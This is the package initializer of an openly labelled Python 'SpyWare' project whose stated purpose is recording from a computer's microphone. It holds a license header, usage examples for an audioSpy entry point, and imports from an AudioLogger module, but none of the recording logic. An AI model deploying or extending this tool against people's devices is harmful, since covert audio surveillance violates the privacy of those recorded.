#!/usr/bin/env python3
# -*- coding: utf-8 -*-

###################
#    This package implements a SpyWare to record from microphone.
#    Copyright (C) 2021, 2022  Maurice Lambert

#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <https://www.gnu.org/licenses/>.
###################

"""
This package implements a SpyWare to record from microphone.

~# python3 AudioLogger.py audioSpy.conf

>>> from os import environ
>>> environ['audioSpy.conf'] = 'audioSpy.conf'
>>> from SpyWare.AudioLogger import audioSpy
>>> audioSpy()                  # (using env) OR
>>> audioSpy('audioSpy.conf') # (using config file name) OR
>>> audioSpy(argv=["AudioLogger.py", "audioSpy.conf"]) # (using argv)
"""

__version__ = "1.0.0"
__author__ = "Maurice Lambert"
__author_email__ = "mauricelambert434@gmail.com"
__maintainer__ = "Maurice Lambert"
__maintainer_email__ = "mauricelambert434@gmail.com"
__description__ = """
This module implements a SpyWare to record from microphone.
"""
license = "GPL-3.0 License"
__url__ = "https://github.com/mauricelambert/SpyWare"

copyright = """
SpyWare  Copyright (C) 2021, 2022  Maurice Lambert
This program comes with ABSOLUTELY NO WARRANTY.
This is free software, and you are welcome to redistribute it
under certain conditions.
"""
__license__ = license
__copyright__ = copyright

__all__ = ["Daemon", "audioSpy", "audioConfig"]

try:
    from .AudioLogger import (
        Daemon,
        main as audioSpy,
        config_load as audioConfig,
    )
except ImportError:
    from AudioLogger import (
        Daemon,
        main as audioSpy,
        config_load as audioConfig,
    )
